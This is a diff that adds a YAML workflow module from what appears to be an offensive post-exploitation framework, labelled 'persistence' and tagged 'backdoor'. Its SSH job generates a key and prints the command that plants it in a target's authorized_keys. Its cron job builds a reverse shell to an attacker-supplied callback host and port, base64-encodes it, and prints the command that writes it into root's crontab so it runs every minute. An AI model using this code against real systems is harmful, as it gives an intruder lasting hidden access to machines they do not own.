@@ -1,0 +1,79 @@
+name: persistence
+description: Persistence mechanisms — establish persistent access via scheduled tasks,
+  services, SSH keys, and WMI subscriptions.
+tags:
+- post
+- persistence
+- backdoor
+- scheduled-task
+- ssh
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target host
+      alias: t
+    username:
+      required: true
+      type: string
+      description: Admin username
+    password:
+      type: string
+      default: ''
+      description: Password
+    lhost:
+      required: true
+      type: string
+      description: Callback host/IP for reverse connections
+    lport:
+      type: number
+      default: 4444
+      description: Callback port
+    method:
+      type: string
+      default: ssh-key
+      description: 'Method: ssh-key, scheduled-task, wmi, cron'
+    log_command:
+      type: string
+      default: 'true'
+      description: Enable command logging
+jobs:
+  ssh-persistence:
+    name: SSH Key Persistence
+    run_if: '{{ inputs.method == ''ssh-key'' }}'
+    steps:
+    - name: add-ssh-key
+      script: "import os, subprocess\n\nssh_dir = os.path.expanduser(\"~/.ssh\")\n\
+        os.makedirs(ssh_dir, exist_ok=True)\nkey_path = os.path.join(ssh_dir, \"id_rsa\"\
+        )\nif not os.path.exists(key_path):\n    subprocess.run([\"ssh-keygen\", \"\
+        -t\", \"rsa\", \"-b\", \"4096\", \"-f\", key_path, \"-N\", \"\", \"-q\"])\n\
+        \n# Read public key\nwith open(key_path + \".pub\") as f:\n    pubkey = f.read().strip()\n\
+        \nprint(f\"Add this key to authorized_keys on target:\")\nprint(f\"echo '{pubkey}'\
+        \ >> ~/.ssh/authorized_keys\")\nprint(f\"\\nConnect: ssh -i {key_path} {{\
+        \ inputs.username }}@{{ inputs.target }}\")\nadd_outputs(ssh_key=key_path,\
+        \ pubkey=pubkey)"
+  cron-persistence:
+    name: Cron Job Persistence
+    run_if: '{{ inputs.method == ''cron'' }}'
+    steps:
+    - name: add-cron
+      script: 'import base64
+
+
+        # Generate a simple reverse shell cron job
+
+        payload = f"* * * * * /bin/bash -c ''bash -i >& /dev/tcp/{{ inputs.lhost }}/{{
+        inputs.lport }} 0>&1''"
+
+        encoded = base64.b64encode(payload.encode()).decode()
+
+        print(f"Cron job payload (base64):")
+
+        print(encoded)
+
+        print(f"\nExecute on target:")
+
+        print(f"echo {encoded} | base64 -d >> /var/spool/cron/crontabs/root")
+
+        add_outputs(payload=payload, encoded=encoded)'
